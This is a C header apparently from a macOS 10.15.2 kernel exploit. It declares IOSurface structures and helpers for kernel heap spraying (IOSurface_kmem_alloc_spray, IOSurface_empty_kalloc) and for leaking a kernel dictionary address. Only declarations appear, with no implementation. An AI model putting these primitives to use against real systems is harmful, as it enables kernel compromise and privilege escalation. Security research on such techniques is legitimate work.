#include <stdbool.h>

// macOS 10.15.2; varies with version
// tip: find bzero's a2 arguments from IOSurfaceClient::getLockResult
#define IOSURFACE_CREATE_OUTSIZE 0xdd0 

struct _IOSurfaceFastCreateArgs {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixel_format;
    uint32_t bytes_per_element;
    uint32_t bytes_per_row;
    uint32_t alloc_size;
};

struct IOSurfaceLockResult {
    uint64_t addr1;
    uint64_t addr2;
    uint64_t addr3;
    uint32_t surface_id;
    uint8_t _pad2[IOSURFACE_CREATE_OUTSIZE-0x18-0x4];
};

struct IOSurfaceValueResultArgs {
    uint32_t out;
};

struct IOSurfaceValueArgs {
    uint32_t surface_id;
    uint32_t _out1;
    union {
        uint32_t xml[0];
        char string[0];
    };
};

struct IOSurfaceValueArgs_string {
    uint32_t surface_id;
    uint32_t _out1;
    uint32_t string_data;
    char null;
};



bool
IOSurface_init();

void
IOSurface_deinit();

kern_return_t
IOSurface_set_value(const struct IOSurfaceValueArgs *args, size_t args_size);

kern_return_t
IOSurface_get_value(const struct IOSurfaceValueArgs *in, size_t in_size,
        struct IOSurfaceValueArgs *out, size_t *out_size);

kern_return_t
IOSurface_remove_value(const struct IOSurfaceValueArgs *args, size_t args_size);

uint32_t transpose(uint32_t val);

int IOSurface_empty_kalloc(uint32_t size, uint32_t kalloc_key);

uint64_t userdict_from_IOSurface(void);

int IOSurface_remove_property(uint32_t key);

int IOSurface_kmem_alloc_spray(void *data, uint32_t size, int count, uint32_t kalloc_key);